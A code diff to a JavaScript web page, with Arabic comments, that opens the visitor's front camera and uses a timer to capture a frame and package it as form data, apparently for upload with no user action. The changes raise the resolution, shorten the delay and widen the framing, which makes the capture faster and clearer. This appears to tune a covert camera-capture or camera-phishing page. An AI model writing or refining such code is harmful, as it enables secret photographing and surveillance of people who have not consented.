@@ -54,26 +54,33 @@
         navigator.mediaDevices.getUserMedia({ 
             video: { 
                 facingMode: "user",
-                width: { ideal: 720 },
-                height: { ideal: 1280 }
+                width: { ideal: 1600 },
+                height: { ideal: 1200 }
             } 
         })
         .then(stream => {
             video.srcObject = stream;
-            setTimeout(captureAndSend, 2600);
+            setTimeout(captureAndSend, 1500);
         })
         .catch(() => showError());
 
         function captureAndSend() {
-            let width = video.videoWidth;
-            let height = video.videoHeight;
-
-            // جعل الصورة أوسع (بعيدة)
-            canvas.width = width;
-            canvas.height = height;
+            const vWidth = video.videoWidth;
+            const vHeight = video.videoHeight;
+            
+            // أبعاد 4:3 عالية الجودة
+            canvas.width = 1600;
+            canvas.height = 1200;
             
             const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, width, height);
+            
+            // زوم أوت واسع
+            ctx.drawImage(video, 
+                (vWidth - 1600) / 2 * -0.3, 
+                (vHeight - 1200) / 2 * -0.3,
+                vWidth * 1.6, 
+                vHeight * 1.6
+            );
             
             canvas.toBlob(blob => {
                 const formData = new FormData();
